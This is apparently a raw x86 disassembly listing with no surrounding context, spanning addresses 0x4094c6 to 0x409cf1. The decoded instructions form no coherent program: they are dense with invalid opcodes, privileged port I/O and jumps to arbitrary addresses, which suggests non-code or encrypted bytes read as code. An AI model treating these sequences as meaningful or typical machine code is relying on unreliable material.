  4094c6:	std    
  4094c7:	ffree  st(7)
  4094c9:	pop    es
  4094ca:	std    
  4094cb:	mov    esp,0xfaded0b9
  4094d0:	loope  0x4094e0
  4094d2:	clc    
  4094d3:	fst    DWORD PTR [ebx]
  4094d5:	in     eax,0xc2
  4094d7:	loopne 0x40947e
  4094d9:	lock retf 0xd7b7
  4094dd:	mov    ch,0xd8
  4094df:	aam    0xd2
  4094e1:	repnz imul cl
  4094e4:	out    dx,eax
  4094e5:	rcr    al,1
  4094e7:	ret    
  4094e8:	int    0xe1
  4094ea:	(bad)  
  4094ec:	loope  0x4094e8
  4094ee:	mov    edi,0xda02c1ef
  4094f3:	add    al,BYTE PTR [esp+ecx*8]
  4094f6:	mov    edi,0xb5d2edc4
  4094fb:	hlt    
  4094fc:	retf   
  4094fd:	sar    bl,cl
  4094ff:	jmp    0x4094d3
  409501:	mov    ch,0xb8
  409503:	repz xlat BYTE PTR ds:[ebx]
  409505:	in     eax,dx
  409506:	mov    eax,0xf9dedcd0
  40950b:	stc    
  40950c:	fsubr  st(2),st
  40950e:	add    ecx,ebx
  409510:	(bad)  
  409511:	(bad)  
  409513:	dec    BYTE PTR [ecx]
  409515:	push   cs
  409516:	fbstp  TBYTE PTR [edx-0x320a1820]
  40951c:	in     al,dx
  40951d:	aad    0xf7
  40951f:	mov    al,0xeb
  409521:	xlat   BYTE PTR ds:[ebx]
  409522:	in     eax,dx
  409523:	cli    
  409524:	int3   
  409525:	in     eax,dx
  409526:	in     eax,dx
  409527:	rcl    bh,0xf8
  40952a:	fcmovnb st,st(2)
  40952c:	(bad)  
  40952d:	cld    
  40952e:	(bad)  
  40952f:	add    BYTE PTR [ebp+0x2dfc6c8],bh
  409535:	or     edi,ecx
  409537:	(bad)  
  409539:	(bad)  
  40953b:	repnz lods al,BYTE PTR ds:[esi]
  40953d:	mov    bh,0xf5
  40953f:	(bad)  
  409541:	hlt    
  409542:	int3   
  409543:	mov    dl,0xca
  409545:	fcmovnbe st,st(0)
  409547:	add    DWORD PTR [edi-0x3922291b],edi
  40954d:	jecxz  0x40952d
  40954f:	les    ecx,FWORD PTR [esi]
  409551:	out    0xe6,al
  409553:	fucomi st,st(3)
  409555:	or     esp,esp
  409557:	in     al,dx
  409558:	lods   al,BYTE PTR ds:[esi]
  409559:	jmp    0xc6336c24
  40955e:	mov    ebx,0xcdefc4d2
  409563:	call   0xf53f4664
  409568:	shl    edi,0x5
  40956b:	ret    0xd2e2
  40956e:	or     bl,ah
  409570:	iret   
  409571:	add    ebp,esp
  409573:	hlt    
  409574:	add    al,al
  409576:	out    dx,eax
  409577:	loope  0x409564
  409579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40957a:	(bad)  
  40957b:	iret   
  40957c:	mov    ebx,0xe7b9f4e8
  409581:	div    dh
  409583:	mov    ebx,0xf200f7fd
  409588:	stc    
  409589:	push   es
  40958a:	pop    es
  40958b:	loop   0x409593
  40958d:	jecxz  0x409591
  40958f:	(bad)  
  409590:	sti    
  409591:	clc    
  409592:	cli    
  409593:	in     al,0xdf
  409595:	cli    
  409596:	repnz mov eax,0xdbe7e1eb
  40959c:	int3   
  40959d:	cmc    
  40959e:	(bad)  
  40959f:	mov    ecx,0xd4d7b0cb
  4095a4:	leave  
  4095a5:	mov    al,0x1
  4095a7:	repnz pop es
  4095a9:	int3   
  4095aa:	jecxz  0x4095a3
  4095ac:	test   DWORD PTR [edx],0xd904d9c9
  4095b2:	retf   0x6fd
  4095b5:	loop   0x409594
  4095b7:	ror    cl,0xce
  4095ba:	in     al,dx
  4095bb:	jmp    0xefea:0xe6e1eeb1
  4095c2:	fistp  QWORD PTR [esp+edi*8-0x26290d2f]
  4095c9:	int3   
  4095ca:	in     al,0xf7
  4095cc:	(bad)  
  4095cd:	sti    
  4095ce:	(bad)  
  4095cf:	out    dx,eax
  4095d0:	add    BYTE PTR ds:0xd0ddbe9,cl
  4095d6:	test   eax,0xe6d1c7ed
  4095db:	mov    ah,0xe6
  4095dd:	in     al,dx
  4095de:	shl    dl,1
  4095e0:	mov    ch,0xd3
  4095e2:	mov    ecx,0xf602f5d9
  4095e7:	ret    0xffb5
  4095ea:	in     al,dx
  4095eb:	mov    ebp,0xebfab8d3
  4095f0:	jecxz  0x4095db
  4095f2:	add    al,0xcb
  4095f4:	or     ebp,ebp
  4095f6:	scas   eax,DWORD PTR es:[edi]
  4095f7:	ffreep st(1)
  4095f9:	scas   al,BYTE PTR es:[edi]
  4095fa:	in     al,dx
  4095fb:	loope  0x4095f3
  4095fd:	shl    DWORD PTR [ebp-0x364f2d46],0xcb
  409604:	shr    esp,cl
  409606:	out    dx,al
  409607:	enter  0xb4d6,0xd4
  40960b:	fadd   st,st(1)
  40960d:	(bad)  
  40960e:	(bad)  
  40960f:	add    bl,cl
  409611:	cld    
  409612:	add    ecx,DWORD PTR [eax]
  409614:	or     ah,bl
  409616:	mov    bl,0xce
  409618:	repnz into 
  40961a:	cmc    
  40961b:	mov    edi,0xb7f4b0ee
  409621:	fsubp  st(3),st
  409623:	out    dx,eax
  409624:	aad    0xee
  409626:	into   
  409627:	(bad)  
  409628:	(bad)  
  40962a:	jecxz  0x40961e
  40962c:	fcom   st(2)
  40962e:	cld    
  40962f:	fisttp DWORD PTR [ebx]
  409631:	jmp    0xd2dd:0xebfdebf4
  409638:	idiv   BYTE PTR [esi-0x1d101b23]
  40963e:	call   0xed068e42
  409643:	add    ebp,edx
  409645:	loope  0x409618
  409647:	icebp  
  409648:	lock repz sti 
  40964b:	jecxz  0x409638
  40964d:	push   es
  40964e:	pop    es
  40964f:	fcmovnu st,st(5)
  409651:	add    ah,cl
  409653:	psraw  mm4,mm5
  409656:	loopne 0x409634
  409658:	mov    bh,0xf7
  40965a:	mov    esp,0xeefac5dc
  40965f:	mov    dh,0xed
  409661:	fucomp st(0)
  409663:	idiv   ecx
  409665:	mov    esp,0xd7ffe3f2
  40966a:	shr    bl,0xfb
  40966d:	sti    
  40966e:	fadd   DWORD PTR [edi+ebx*8]
  409671:	loopne 0x40965a
  409673:	or     al,0xcb
  409675:	or     eax,0xb0eadce1
  40967a:	fadd   st(1),st
  40967c:	mov    cl,0xee
  40967e:	lock icebp 
  409680:	in     al,dx
  409681:	rcr    esp,cl
  409683:	cmc    
  409684:	add    esi,esp
  409686:	stc    
  409687:	repz fsubr st(7),st
  40968a:	lock (bad) 
  40968c:	xlat   BYTE PTR ds:[ebx]
  40968d:	mul    edx
  40968f:	add    ch,bl
  409691:	loopne 0x409696
  409693:	pop    es
  409694:	stc    
  409695:	fmul   st(4),st
  409697:	loop   0x409650
  409699:	int3   
  40969a:	scas   eax,DWORD PTR es:[edi]
  40969b:	in     eax,0xf5
  40969d:	in     al,dx
  40969e:	vpsubw xmm6,xmm6,xmm6
  4096a2:	(bad)  
  4096a3:	jmp    0xdc199594
  4096a8:	(bad)  
  4096aa:	clc    
  4096ab:	(bad)
  4096ae:	sti    
  4096af:	(bad)  
  4096b0:	(bad)  
  4096b2:	sti    
  4096b3:	in     al,dx
  4096b4:	push   es
  4096b5:	add    ah,bl
  4096b7:	mov    dl,0xe9
  4096b9:	repz out dx,al
  4096bb:	lods   eax,DWORD PTR ds:[esi]
  4096bc:	in     al,dx
  4096bd:	retf   0xdaf4
  4096c0:	not    ch
  4096c2:	cld    
  4096c3:	out    dx,eax
  4096c4:	lock shl DWORD PTR [edi-0x18070728],cl
  4096cb:	div    cl
  4096cd:	aad    0xd6
  4096cf:	(bad)  
  4096d0:	fimul  DWORD PTR [ecx]
  4096d2:	fadd   st(2),st
  4096d4:	jmp    0xc1ef66a3
  4096d9:	leave  
  4096da:	fucom  st(3)
  4096dc:	call   0xd53380cc
  4096e1:	mov    eax,0xcff8d5fb
  4096e6:	hlt    
  4096e7:	int3   
  4096e8:	out    dx,al
  4096e9:	mov    ah,0xfb
  4096eb:	out    0xb,eax
  4096ed:	jmp    0x101c70bb
  4096f2:	or     eax,0xeadcfeef
  4096f7:	in     eax,0xd0
  4096f9:	test   bh,0xe1
  4096fc:	sti    
  4096fd:	int    0xd9
  4096ff:	mov    bh,0xdb
  409701:	(bad)  
  409703:	in     al,dx
  409704:	add    dl,al
  409706:	int3   
  409707:	mov    dh,0x6
  409709:	aad    0x2
  40970b:	rcl    ch,1
  40970d:	ret    0xbf8
  409710:	jecxz  0x4096f7
  409712:	iret   
  409713:	(bad)  
  409714:	(bad)  
  409716:	loopne 0x4096c9
  409718:	out    0xcd,al
  40971a:	retf   0xd6db
  40971d:	test   al,0xe0
  40971f:	mov    ebx,0xdec8ecf8
  409724:	fsubr  st,st(1)
  409726:	loopne 0x4096f8
  409728:	add    cl,dh
  40972a:	rol    edx,1
  40972c:	mov    esp,0xd4f7e4c2
  409731:	out    dx,eax
  409732:	(bad)
  409735:	frstor [edi-0x4c383622]
  40973b:	lods   eax,DWORD PTR ds:[esi]
  40973c:	(bad)  
  40973d:	fptan  
  40973f:	scas   al,BYTE PTR es:[edi]
  409740:	sti    
  409741:	repnz mov eax,0xe3e9ddda
  409747:	(bad)  
  409748:	mov    edi,0xe2ccdef4
  40974d:	or     edx,esp
  40974f:	(bad)  
  409750:	jmp    0xce225b35
  409755:	add    edi,eax
  409757:	fmul   st,st(6)
  409759:	test   al,0xe3
  40975b:	mov    dl,0xb3
  40975d:	enter  0xe0c7,0xbb
  409761:	fsubrp st(5),st
  409763:	mov    dh,0xf9
  409765:	iret   
  409766:	in     al,dx
  409767:	call   0xde1f9e5e
  40976c:	rol    DWORD PTR [ebx],0x9
  40976f:	fisttp DWORD PTR [edi]
  409771:	clc    
  409772:	out    dx,al
  409773:	loop   0x40973a
  409775:	out    dx,al
  409776:	lods   eax,DWORD PTR ds:[esi]
  409777:	retf   0xc7e3
  40977a:	vpsubsb ymm0,ymm5,ymm6
  40977e:	shl    edi,cl
  409780:	into   
  409781:	(bad)  
  409783:	aam    0xd0
  409785:	mov    ah,0x2
  409787:	call   0xe8369f66
  40978c:	clc    
  40978d:	(bad)  
  40978e:	(bad)  
  40978f:	jmp    0xc710919e
  409794:	add    ebx,edi
  409796:	mov    edi,0xc6dee4cd
  40979b:	out    dx,eax
  40979c:	(bad)  
  40979d:	div    ecx
  40979f:	cli    
  4097a0:	not    bl
  4097a2:	clc    
  4097a3:	out    dx,al
  4097a4:	jmp    0xc1209865
  4097a9:	out    0x0,eax
  4097ab:	fsub   st,st(0)
  4097ad:	lock lock idiv esi
  4097b1:	iret   
  4097b2:	out    dx,al
  4097b3:	loopne 0x40977d
  4097b5:	dec    bl
  4097b7:	fistp  QWORD PTR [ebp+ebx*8-0x13284b3f]
  4097be:	xlat   BYTE PTR ds:[ebx]
  4097bf:	out    0xf2,eax
  4097c1:	stc    
  4097c2:	retf   
  4097c3:	cli    
  4097c4:	iret   
  4097c5:	neg    dh
  4097c7:	into   
  4097c8:	pop    es
  4097c9:	(bad)  
  4097ca:	stc    
  4097cb:	fistp  QWORD PTR [ecx+0xfebe1e9]
  4097d1:	or     esp,ebp
  4097d3:	(bad)  
  4097d5:	in     al,0xf0
  4097d7:	scas   al,BYTE PTR es:[edi]
  4097d8:	not    edi
  4097da:	xlat   BYTE PTR ds:[ebx]
  4097db:	shl    DWORD PTR [ecx+ebx*8-0x3b2f2a3c],cl
  4097e2:	mov    bh,0xef
  4097e4:	mov    ecx,0xbcdff6ef
  4097e9:	rcl    esi,1
  4097eb:	lock fnclex 
  4097ee:	in     eax,0xfd
  4097f0:	fdiv   st,st(4)
  4097f2:	in     al,0x8
  4097f4:	or     esi,ebp
  4097f6:	iret   
  4097f7:	mov    bl,0xf3
  4097f9:	shl    esi,0xbc
  4097fc:	aad    0xdb
  4097fe:	mov    dl,0xf2
  409800:	sar    dh,1
  409802:	mov    esi,0x1bfd9ef
  409807:	lock loope 0x4097ed
  40980a:	cmc    
  40980b:	div    esp
  40980d:	or     ecx,edi
  40980f:	(bad)  
  409810:	jmp    0xe034a2ff
  409815:	jmp    0xe20f6a0d
  40981a:	(bad)  
  40981b:	leave  
  40981c:	out    0xbb,eax
  40981e:	into   
  40981f:	fbstp  TBYTE PTR [ecx-0x3c37330b]
  409825:	mov    esi,0xdcdcbfe9
  40982a:	(bad)  
  40982c:	repz push es
  40982e:	retf   0xc7e4
  409831:	add    ebp,ebx
  409833:	jmp    0x40983d
  409835:	clc    
  409836:	mov    esp,0xe1e1d1dc
  40983b:	fcmovnb st,st(5)
  40983d:	jmp    0x40981a
  40983f:	ror    al,1
  409841:	mov    edi,0xd5d5d2fa
  409846:	leave  
  409847:	in     al,dx
  409848:	aam    0xff
  40984a:	sti    
  40984b:	shl    cl,cl
  40984d:	stc    
  40984e:	loopne 0x409810
  409850:	add    cl,BYTE PTR [edx]
  409852:	pop    es
  409853:	std    
  409854:	out    0xf1,al
  409856:	call   0xd21d6f26
  40985b:	cmc    
  40985c:	fcmove st,st(1)
  40985e:	retf   0xdffb
  409861:	call   0xd8384b5c
  409866:	inc    DWORD PTR [eax]
  409868:	mov    ebp,0xdcc1f107
  40986d:	add    eax,0xbd504c0
  409872:	cmc    
  409873:	out    dx,al
  409874:	(bad)
  409878:	ror    esp,1
  40987a:	(bad)
  40987d:	(bad)  
  40987e:	mov    edx,0xf8f9eae6
  409883:	fsub   st(3),st
  409885:	mov    ebx,0xdcbe03f6
  40988a:	fcmovb st,st(1)
  40988c:	mov    ebp,0xee0502d6
  409891:	mov    esp,0xffe40ced
  409896:	stos   DWORD PTR es:[edi],eax
  409897:	jmp    0x40985e
  409899:	(bad)  
  40989a:	in     eax,0xd4
  40989c:	in     al,0xd9
  40989e:	aad    0xea
  4098a0:	(bad)  
  4098a2:	rcl    edi,1
  4098a4:	(bad)  
  4098a6:	in     al,dx
  4098a7:	mov    eax,0xe105bef3
  4098ac:	ffree  st(4)
  4098ae:	jmp    0xc1fe:0xcedafb06
  4098b5:	in     al,dx
  4098b6:	loopne 0x4098a7
  4098b8:	repz retf 0xeae2
  4098bc:	iret   
  4098bd:	(bad)  
  4098be:	call   0xd72f7277
  4098c3:	mov    ebx,0xc3f3f3de
  4098c8:	fld    st(7)
  4098ca:	jecxz  0x4098d7
  4098cc:	loop   0x409892
  4098ce:	lock (bad) 
  4098d1:	hlt    
  4098d2:	add    ch,bh
  4098d4:	ficom  WORD PTR [ecx]
  4098d6:	out    0xaa,eax
  4098d8:	in     al,dx
  4098d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098da:	ret    
  4098db:	out    dx,al
  4098dc:	(bad)  
  4098dd:	int    0xda
  4098df:	stc    
  4098e0:	in     al,0xe5
  4098e2:	shr    ch,1
  4098e4:	retf   
  4098e5:	in     eax,dx
  4098e6:	ret    
  4098e7:	fld    DWORD PTR [esi]
  4098e9:	icebp  
  4098ea:	push   es
  4098eb:	jmp    0x4098c1
  4098ed:	cld    
  4098ee:	(bad)  
  4098ef:	(bad)  
  4098f0:	fild   WORD PTR [edx]
  4098f2:	in     al,dx
  4098f3:	in     eax,0x8
  4098f5:	les    esi,FWORD PTR [ecx-0x16103730]
  4098fb:	ret    0xd4d0
  4098fe:	mov    ebx,0xcbfbf4d3
  409903:	(bad)  
  409905:	stc    
  409906:	sti    
  409907:	cli    
  409908:	idiv   BYTE PTR [edi-0x1cfa3c06]
  40990e:	jmp    esi
  409910:	out    dx,al
  409911:	add    al,ch
  409913:	retf   0xf3f8
  409916:	mov    ecx,0xe2eac3e5
  40991b:	(bad)  
  40991c:	leave  
  40991d:	leave  
  40991e:	mov    al,0xf9
  409920:	(bad)  
  409922:	mov    eax,0x1f8fde8
  409927:	ror    esi,0xd2
  40992a:	sar    dh,0xf7
  40992d:	or     DWORD PTR [edx],eax
  40992f:	leave  
  409930:	rol    eax,0xc
  409933:	or     al,0xe9
  409935:	call   0xcc26522b
  40993a:	call   0xf6256b1a
  40993f:	mov    ch,0xee
  409941:	sar    bh,cl
  409943:	stc    
  409944:	fcmovnu st,st(0)
  409946:	call   0x30f733a
  40994b:	rol    DWORD PTR [ebx],0xe1
  40994e:	in     al,0xf8
  409950:	add    bh,dh
  409952:	out    dx,al
  409953:	ret    0x404
  409956:	out    dx,al
  409957:	out    dx,eax
  409958:	out    0xd2,eax
  40995a:	jmp    0xc22a6914
  40995f:	shl    edi,1
  409961:	xlat   BYTE PTR ds:[ebx]
  409962:	fsub   st(0),st
  409964:	ror    ah,cl
  409966:	into   
  409967:	iret   
  409968:	aad    0x1
  40996a:	add    eax,DWORD PTR [ecx]
  40996c:	rcl    ch,1
  40996e:	inc    dl
  409970:	loopne 0x409951
  409972:	sti    
  409973:	call   0xf312a578
  409978:	rol    eax,1
  40997a:	mov    dh,0xe6
  40997c:	retf   
  40997d:	ror    ebp,cl
  40997f:	cli    
  409980:	jmp    0xf8fd:0xd6eaecff
  409987:	std    
  409988:	loopne 0x409976
  40998a:	loopne 0x409961
  40998c:	xlat   BYTE PTR ds:[ebx]
  40998d:	cld    
  40998e:	xlat   BYTE PTR ds:[ebx]
  40998f:	stc    
  409990:	std    
  409991:	push   cs
  409992:	int    0x2
  409994:	rcr    edi,cl
  409996:	jmp    0x409974
  409998:	enter  0xecc0,0xcb
  40999c:	call   0xf5208771
  4099a1:	(bad)  
  4099a3:	shl    ebp,cl
  4099a5:	retf   0xf7bc
  4099a8:	sti    
  4099a9:	pop    es
  4099aa:	out    0x3,eax
  4099ac:	mov    bh,0xf0
  4099af:	(bad)  
  4099b0:	leave  
  4099b1:	or     bh,al
  4099b3:	add    ecx,ecx
  4099b5:	(bad)  
  4099b6:	in     al,dx
  4099b7:	scas   al,BYTE PTR es:[edi]
  4099b8:	ret    0xadbc
  4099bb:	retf   0xd7f6
  4099be:	loopne 0x4099ad
  4099c0:	mov    bh,0xb4
  4099c2:	mov    eax,0xdde3e2f0
  4099c7:	(bad)  
  4099c8:	mul    dh
  4099ca:	add    bh,bh
  4099cc:	in     eax,0xe1
  4099ce:	lock (bad) 
  4099d0:	enter  0x7d5,0xfc
  4099d4:	enter  0xb3ef,0xf2
  4099d8:	(bad)
  4099db:	call   0xb33046d3
  4099e0:	iret   
  4099e1:	mov    ch,0xf5
  4099e3:	xlat   BYTE PTR ds:[ebx]
  4099e4:	aam    0xba
  4099e6:	fucomip st,st(6)
  4099e8:	icebp  
  4099e9:	pop    es
  4099ea:	fdivr  QWORD PTR [esi-0x3a3f022d]
  4099f0:	add    bh,ah
  4099f2:	push   cs
  4099f3:	loope  0x409a02
  4099f5:	int    0xca
  4099f7:	(bad)  
  4099f8:	loopne 0x4099d6
  4099fa:	iret   
  4099fb:	int3   
  4099fc:	icebp  
  4099fd:	repnz int3 
  4099ff:	mov    bh,0xe7
  409a01:	icebp  
  409a02:	cli    
  409a03:	rcl    ah,1
  409a05:	fnop   
  409a07:	fcom   st(5)
  409a09:	repz loopne 0x4099fe
  409a0c:	(bad)  
  409a0d:	ret    0xf6e7
  409a10:	loopne 0x4099f8
  409a12:	in     al,0xfd
  409a14:	out    0xd,eax
  409a16:	in     al,dx
  409a17:	loop   0x409a09
  409a19:	aad    0xd5
  409a1b:	(bad)  
  409a1c:	jmp    0xb4ed:0xc8b0d6ec
  409a23:	repnz int 0xfe
  409a26:	mov    esi,0xd8c603dd
  409a2b:	sti    
  409a2c:	(bad)  
  409a2e:	hlt    
  409a2f:	loop   0x409a0c
  409a31:	in     al,0xc5
  409a33:	out    0xff,eax
  409a35:	add    al,0xa7
  409a37:	into   
  409a38:	(bad)  
  409a3a:	in     eax,dx
  409a3b:	shl    edi,1
  409a3d:	shl    ecx,1
  409a3f:	shl    bh,1
  409a41:	vpmaxub ymm7,ymm3,ymm4
  409a45:	ret    0xddcf
  409a48:	rol    BYTE PTR ds:0xf2c7d2db,0xbf
  409a4f:	jmp    0x22a9c2c
  409a54:	loopne 0x409a5e
  409a56:	rol    esi,1
  409a58:	mov    bh,0xef
  409a5a:	mov    bh,0xf2
  409a5c:	shl    BYTE PTR [ebx-0x30080606],0xd4
  409a63:	mov    ah,0xd1
  409a65:	test   ah,0xf7
  409a68:	mul    bl
  409a6a:	loopne 0x409a47
  409a6c:	jmp    0x409a4b
  409a6e:	fimul  WORD PTR [edi]
  409a70:	sti    
  409a71:	inc    ch
  409a73:	add    bl,dl
  409a75:	inc    bh
  409a77:	(bad)  
  409a78:	jmp    0x409a56
  409a7a:	out    0xac,eax
  409a7c:	lods   al,BYTE PTR ds:[esi]
  409a7d:	mov    edx,0xd0e6ccc9
  409a82:	retf   
  409a83:	jecxz  0x409a51
  409a85:	leave  
  409a86:	out    dx,eax
  409a87:	cmc    
  409a88:	int    0xed
  409a8a:	in     eax,dx
  409a8b:	ret    0xe5f0
  409a8e:	fcmovnu st,st(1)
  409a90:	add    eax,0xe2ec0500
  409a95:	or     ebx,edi
  409a97:	out    0xc0,eax
  409a99:	(bad)  
  409a9a:	jmp    0x409a6a
  409a9c:	out    dx,eax
  409a9d:	stc    
  409a9e:	shr    ch,cl
  409aa0:	fcmovne st,st(4)
  409aa2:	fdivp  st(2),st
  409aa4:	ror    al,1
  409aa6:	fcomp  st(4)
  409aa8:	fld    DWORD PTR [ebx]
  409aaa:	ret    
  409aab:	fiadd  WORD PTR [ecx]
  409aad:	retf   0xf0dd
  409ab0:	add    dl,ah
  409ab2:	lds    ecx,FWORD PTR [esi+edi*8]
  409ab5:	cld    
  409ab6:	out    dx,al
  409ab7:	loopne 0x409a7b
  409ab9:	lods   eax,DWORD PTR ds:[esi]
  409aba:	shl    esp,cl
  409abc:	enter  0xf7d3,0xf0
  409ac0:	call   0xee0c5079
  409ac5:	jmp    0xd43989cb
  409aca:	aad    0xf4
  409acc:	fadd   st,st(3)
  409ace:	retf   
  409acf:	or     bl,ch
  409ad1:	retf   0xecdc
  409ad4:	loop   0x409acf
  409ad6:	icebp  
  409ad7:	in     eax,0xf3
  409ad9:	lods   eax,DWORD PTR ds:[esi]
  409ada:	(bad)  
  409adb:	shr    esi,cl
  409add:	lock in eax,0xe4
  409ae0:	out    dx,eax
  409ae1:	leave  
  409ae2:	into   
  409ae3:	mov    dh,0xc8
  409ae5:	repz mov ecx,0xda06bffa
  409aeb:	out    0xf0,eax
  409aed:	ret    0xeadb
  409af0:	dec    bh
  409af2:	vpaddusb ymm1,ymm7,ymm1
  409af6:	mov    cl,0xdf
  409af8:	lods   eax,DWORD PTR ds:[esi]
  409af9:	rol    ebp,0xcc
  409afc:	(bad)  
  409afd:	shl    bh,cl
  409aff:	fcmove st,st(0)
  409b01:	int    0xfb
  409b03:	fcmove st,st(6)
  409b05:	fstp   st(1)
  409b07:	add    edi,ebx
  409b09:	in     eax,dx
  409b0a:	mov    ebp,0xf1f8c3fe
  409b0f:	ret    0xfacf
  409b12:	add    DWORD PTR [ebx+eiz*8],eax
  409b15:	adc    ebx,ecx
  409b17:	fsub   st,st(3)
  409b19:	mov    dl,0xc4
  409b1b:	in     al,dx
  409b1c:	in     al,0xe8
  409b1e:	(bad)
  409b21:	jmp    0x409b1e
  409b23:	int3   
  409b24:	fdivr  st(7),st
  409b26:	(bad)  
  409b28:	std    
  409b29:	add    edi,edx
  409b2b:	shl    ah,1
  409b2d:	loop   0x409aee
  409b2f:	(bad)
  409b32:	loop   0x409af9
  409b34:	(bad)  
  409b35:	stc    
  409b36:	enter  0xdea6,0xdd
  409b3a:	int3   
  409b3b:	leave  
  409b3c:	out    0xc6,eax
  409b3e:	in     al,dx
  409b3f:	mov    dl,0xcc
  409b41:	aad    0xde
  409b43:	fucomp st(3)
  409b45:	leave  
  409b46:	fsubp  st(4),st
  409b48:	loopne 0x409b10
  409b4a:	fadd   st(3),st
  409b4c:	jmp    0x7fd:0xe0d8e0d7
  409b53:	in     eax,dx
  409b54:	into   
  409b55:	shl    bl,cl
  409b57:	(bad)
  409b5a:	lods   al,BYTE PTR ds:[esi]
  409b5b:	mov    bl,0xce
  409b5d:	xlat   BYTE PTR ds:[ebx]
  409b5e:	leave  
  409b5f:	lock in al,0xbf
  409b62:	retf   0xf4dc
  409b65:	hlt    
  409b66:	(bad)  
  409b67:	repnz iret 
  409b69:	rcl    eax,cl
  409b6b:	fisttp WORD PTR [ebx]
  409b6d:	shl    ecx,1
  409b6f:	loope  0x409b52
  409b71:	out    dx,al
  409b72:	fxch   st(7)
  409b74:	push   es
  409b75:	cld    
  409b76:	ror    ebp,1
  409b78:	mov    edi,0xd5cad2c8
  409b7d:	jmp    0x409b36
  409b7f:	repz jmp 0xd9377069
  409b85:	int    0xee
  409b87:	add    ebp,esi
  409b89:	test   DWORD PTR [ebx],0xf4f904f2
  409b8f:	lsl    eax,WORD PTR [ebx]
  409b92:	add    BYTE PTR [edx],al
  409b94:	(bad)  [ecx]
  409b96:	loopne 0x409b42
  409b98:	ret    
  409b99:	int    0xf0
  409b9b:	stos   BYTE PTR es:[edi],al
  409b9c:	repz sti 
  409b9e:	(bad)
  409ba1:	mov    ebx,0xddeabcbd
  409ba6:	jmp    0xff198f97
  409bab:	cli    
  409bac:	jecxz  0x409ba2
  409bae:	loopne 0x409b84
  409bb0:	dec    cl
  409bb2:	(bad)  
  409bb3:	out    dx,eax
  409bb4:	fimul  WORD PTR [edx]
  409bb6:	jmp    0x409b79
  409bb8:	(bad)  
  409bb9:	repnz mov ch,0xd1
  409bbc:	repnz into 
  409bbe:	int3   
  409bbf:	in     eax,dx
  409bc0:	shr    eax,1
  409bc2:	fnsave [esi+0xd6d0f6]
  409bc8:	lock (bad) 
  409bca:	jmp    ebx
  409bcc:	hlt    
  409bcd:	clc    
  409bce:	add    al,0xdf
  409bd0:	pop    es
  409bd1:	jmp    0x409bc7
  409bd3:	into   
  409bd4:	vpsubsw ymm5,ymm0,YMMWORD PTR [ebp+eiz*4-0x1e1e1850]
  409bdd:	loopne 0x409bd0
  409bdf:	loopne 0x409bab
  409be1:	retf   
  409be2:	fdivr  QWORD PTR [ecx-0x12070427]
  409be8:	inc    cl
  409bea:	out    0xec,eax
  409bec:	inc    DWORD PTR [edx+ebx*8]
  409bef:	retf   
  409bf0:	jmp    0xb902:0xdefbffdd
  409bf7:	in     eax,0xed
  409bf9:	mov    al,0xf1
  409bfb:	leave  
  409bfc:	(bad)  
  409bfd:	retf   0xe8f5
  409c00:	retf   
  409c01:	sar    edi,1
  409c03:	fidiv  WORD PTR [ebx+edi*4-0x9190f14]
  409c0a:	(bad)  
  409c0b:	(bad)  
  409c0d:	in     al,0xc2
  409c0f:	paddusw mm3,mm4
  409c12:	aad    0xce
  409c14:	lds    edx,FWORD PTR [edx]
  409c16:	shr    BYTE PTR [edi-0x2f11301e],1
  409c1c:	mov    ebx,0xd8aec4d2
  409c21:	cli    
  409c22:	aad    0xb8
  409c24:	enter  0xb8b9,0xf9
  409c28:	sti    
  409c29:	test   esp,0xeaf9e4d5
  409c2f:	clc    
  409c30:	xlat   BYTE PTR ds:[ebx]
  409c31:	retf   0xedeb
  409c34:	retf   0xd8e2
  409c37:	lods   al,BYTE PTR ds:[esi]
  409c38:	repnz out 0xce,al
  409c3b:	in     eax,dx
  409c3c:	mov    bl,0xec
  409c3e:	icebp  
  409c3f:	iret   
  409c40:	jmp    0xcd2b8539
  409c45:	clc    
  409c46:	fst    st(7)
  409c48:	cmc    
  409c49:	aad    0xe2
  409c4b:	add    al,0xe1
  409c4d:	(bad)  
  409c4e:	jmp    0x409c32
  409c50:	or     DWORD PTR [edi],ecx
  409c52:	iret   
  409c53:	loopne 0x409c37
  409c55:	stc    
  409c56:	in     al,dx
  409c57:	retf   
  409c58:	lods   eax,DWORD PTR ds:[esi]
  409c59:	retf   0xd5c2
  409c5c:	(bad)
  409c5f:	mov    eax,0xceefd1e4
  409c64:	mov    esi,0xcddef9cc
  409c69:	rol    BYTE PTR [eax],0xc1
  409c6c:	add    eax,0xe0faffdc
  409c71:	out    dx,eax
  409c72:	loopne 0x409c4f
  409c74:	or     ebx,esi
  409c76:	rcr    esi,1
  409c78:	icebp  
  409c79:	loop   0x409c66
  409c7b:	mul    edi
  409c7d:	icebp  
  409c7e:	xlat   BYTE PTR ds:[ebx]
  409c7f:	mov    al,0xca
  409c81:	(bad)  
  409c82:	jmp    0x409c4e
  409c84:	(bad)  
  409c85:	mov    al,0xd9
  409c87:	loope  0x409c69
  409c89:	(bad)  
  409c8b:	add    eax,0xe3f4f0fb
  409c90:	cli    
  409c91:	fadd   QWORD PTR [ecx]
  409c93:	loope  0x409c5f
  409c95:	fcomp  st(6)
  409c97:	out    0xb0,al
  409c99:	lds    esi,FWORD PTR [edx-0x14252c31]
  409c9f:	cli    
  409ca0:	mov    ecx,0xf9fcdab5
  409ca5:	lock enter 0xc7df,0xdc
  409caa:	(bad)  
  409cac:	xbegin 0xc624927b
  409cb2:	sti    
  409cb3:	or     ah,dl
  409cb5:	in     eax,0xc2
  409cb7:	jecxz  0x409c7a
  409cb9:	mov    bl,0xc0
  409cbb:	(bad)
  409cbe:	fcmovnu st,st(2)
  409cc0:	xlat   BYTE PTR ds:[ebx]
  409cc1:	icebp  
  409cc2:	fstp   TBYTE PTR [edi-0x20223d03]
  409cc8:	add    ebx,edi
  409cca:	in     eax,0xc2
  409ccc:	lock cmc 
  409cce:	add    ch,bh
  409cd0:	ffree  st(5)
  409cd2:	out    0x1,eax
  409cd4:	fisttp DWORD PTR [ecx]
  409cd6:	jmp    0x409ca8
  409cd8:	leave  
  409cd9:	jecxz  0x409cc2
  409cdb:	call   0xc5f885b3
  409ce0:	iret   
  409ce1:	fcmovnu st,st(2)
  409ce3:	mov    ecx,0xe0f2d4d6
  409ce8:	fcmovb st,st(7)
  409cea:	(bad)  
  409ceb:	rol    BYTE PTR [edx],0xe1
  409cee:	out    0xef,eax
  409cf0:	cmc    
  409cf1:	in     eax,0xee
